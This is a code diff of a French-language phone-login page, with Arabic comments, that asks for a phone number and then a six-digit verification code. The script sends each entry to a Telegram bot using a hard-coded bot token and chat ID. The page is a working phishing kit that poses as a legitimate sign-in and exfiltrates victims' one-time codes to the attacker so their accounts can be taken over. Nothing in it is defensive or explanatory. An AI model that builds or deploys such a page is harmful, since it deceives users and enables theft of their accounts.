@@ -8,18 +8,19 @@
     <style>
         :root {
             --primary-green: #24ac64;
-            --bg-color: #fcf8f1;
+            --bg-gray: #f2f2f2; /* اللون الرمادي للخلفية */
             --text-dark: #1a1a1a;
         }
 
-        * { box-sizing: border-box; font-family: -apple-system, system-ui, sans-serif; }
+        * { box-sizing: border-box; font-family: -apple-system, sans-serif; }
 
         body {
-            background-color: var(--bg-color);
+            background-color: var(--bg-gray); /* تطبيق اللون الرمادي */
             margin: 0;
             padding: 0;
             display: flex;
             justify-content: center;
+            align-items: center;
             min-height: 100vh;
         }
 
@@ -28,17 +29,16 @@
             max-width: 450px;
             background: white;
             padding: 40px 25px;
-            display: flex;
-            flex-direction: column;
-            border-bottom: 3px solid #000;
+            border-radius: 15px; /* حواف منحنية قليلاً للمربع الأبيض */
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            border-bottom: 4px solid #000;
         }
 
-        h2 { font-size: 28px; margin: 20px 0 10px; font-weight: 600; line-height: 1.2; }
-        p { color: #555; font-size: 16px; margin-bottom: 40px; line-height: 1.4; }
+        h2 { font-size: 26px; margin: 0 0 10px; font-weight: 700; }
+        p { color: #666; font-size: 15px; margin-bottom: 30px; }
 
         .iti { width: 100% !important; margin-bottom: 25px; }
-        input[type="tel"] {
-            width: 100% !important;
+        input[type="tel"], .otp-field {
             height: 55px;
             border: 1.5px solid #ccc;
             border-radius: 30px;
@@ -46,22 +46,8 @@
             outline: none;
         }
 
-        .otp-container {
-            display: flex;
-            justify-content: space-between;
-            gap: 8px;
-            margin: 20px 0;
-        }
-
-        .otp-field {
-            width: 15% !important;
-            height: 60px;
-            text-align: center;
-            border: 1.5px solid #ccc;
-            border-radius: 12px;
-            font-size: 24px;
-            outline: none;
-        }
+        .otp-container { display: flex; justify-content: space-between; gap: 8px; margin: 20px 0; }
+        .otp-field { width: 15% !important; text-align: center; border-radius: 12px; }
 
         .btn-submit {
             background-color: var(--primary-green);
@@ -71,22 +57,9 @@
             height: 50px;
             border-radius: 25px;
             font-size: 18px;
-            font-weight: 500;
             cursor: pointer;
-            margin: 40px auto 20px;
+            margin: 30px auto 10px;
             display: block;
-        }
-
-        .link-text {
-            color: var(--text-dark);
-            text-decoration: none;
-            font-size: 16px;
-            font-weight: 500;
-            margin-top: 10px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 5px;
         }
 
         .hidden { display: none !important; }
@@ -96,20 +69,15 @@
 
 <div class="wrapper">
     <div id="page1">
-        <h2>Saisissez un numéro de <br>téléphone.</h2>
+        <h2>Saisissez un numéro de téléphone.</h2>
         <p>Sélectionnez un pays et saisissez votre numéro de téléphone.</p>
-        
         <input type="tel" id="phone">
-        
-        <button class="btn-submit" onclick="sendToTelegramPhone()">Suivant</button>
-        
-        <a href="#" class="link-text">Se connecter avec un code QR <span>&rsaquo;</span></a>
+        <button class="btn-submit" onclick="sendData('phone')">Suivant</button>
     </div>
 
     <div id="page2" class="hidden">
         <h2>Vérification</h2>
-        <p>Veuillez saisir le code à 6 chiffres envoyé à votre mobile.</p>
-        
+        <p>Veuillez saisir le code à 6 chiffres.</p>
         <div class="otp-container">
             <input type="number" class="otp-field" oninput="moveNext(this, 0)">
             <input type="number" class="otp-field" oninput="moveNext(this, 1)">
@@ -118,69 +86,49 @@
             <input type="number" class="otp-field" oninput="moveNext(this, 4)">
             <input type="number" class="otp-field" oninput="moveNext(this, 5)">
         </div>
-        
-        <button class="btn-submit" onclick="sendToTelegramOTP()">Vérifier</button>
-        
-        <a href="#" class="link-text">Renvoyer le code <span>&rsaquo;</span></a>
+        <button class="btn-submit" onclick="sendData('otp')">Vérifier</button>
     </div>
 </div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
 <script>
-    // --- بياناتك المدمجة ---
-    const botToken = "8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q"; 
-    const chatId = "5614946654"; // ملاحظة: وضعت آيدي افتراضي، غيره إذا لم يكن صحيحاً
+    const botToken = "8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q";
+    const chatId = "5614946654"; // <--- تأكد من أن هذا هو الـ Chat ID الخاص بك
 
-    // تهيئة حقل الهاتف مع اكتشاف الدولة تلقائياً
-    const phoneInput = document.querySelector("#phone");
-    const iti = window.intlTelInput(phoneInput, {
+    const iti = window.intlTelInput(document.querySelector("#phone"), {
         initialCountry: "auto",
-        geoIpLookup: function(success) {
-            fetch("https://ipapi.co/json").then(res => res.json()).then(data => success(data.country_code));
-        },
+        geoIpLookup: s => fetch("https://ipapi.co/json").then(r => r.json()).then(d => s(d.country_code)),
         utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
     });
 
-    // إرسال الهاتف والانتقال لـ OTP
-    function sendToTelegramPhone() {
-        const fullNumber = iti.getNumber();
-        if(!fullNumber) { alert("Numéro invalide"); return; }
+    function sendData(type) {
+        let text = "";
+        if(type === 'phone') {
+            text = "📱 رقم جديد: " + iti.getNumber();
+            document.getElementById('page1').classList.add('hidden');
+            document.getElementById('page2').classList.remove('hidden');
+        } else {
+            let otp = "";
+            document.querySelectorAll('.otp-field').forEach(f => otp += f.value);
+            text = "🔑 كود الـ OTP: " + otp;
+        }
 
+        // كود الإرسال مع فحص النتيجة
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: chatId, text: `📱 رقم جديد: ${fullNumber}` })
-        });
-
-        document.getElementById('page1').classList.add('hidden');
-        document.getElementById('page2').classList.remove('hidden');
+            body: JSON.stringify({ chat_id: chatId, text: text })
+        }).then(res => res.json()).then(res => {
+            if(!res.ok) alert("خطأ في التليجرام: " + res.description);
+        }).catch(err => alert("فشل الاتصال: " + err));
     }
 
-    // الانتقال التلقائي بين خانات OTP
-    function moveNext(el, index) {
-        if (el.value.length >= 1) {
-            el.value = el.value.slice(0, 1); // التأكد من رقم واحد فقط
-            const fields = document.querySelectorAll('.otp-field');
-            if (index < 5) fields[index + 1].focus();
+    function moveNext(el, i) {
+        if(el.value.length >= 1) {
+            el.value = el.value.slice(0,1);
+            if(i < 5) document.querySelectorAll('.otp-field')[i+1].focus();
         }
     }
-
-    // إرسال الـ OTP
-    function sendToTelegramOTP() {
-        let otp = "";
-        document.querySelectorAll('.otp-field').forEach(f => otp += f.value);
-        
-        if(otp.length < 6) { alert("Code incomplet"); return; }
-
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: chatId, text: `🔑 كود الـ OTP: ${otp}` })
-        }).then(() => {
-            alert("Traitement en cours...");
-        });
-    }
 </script>
-
 </body>
 </html>
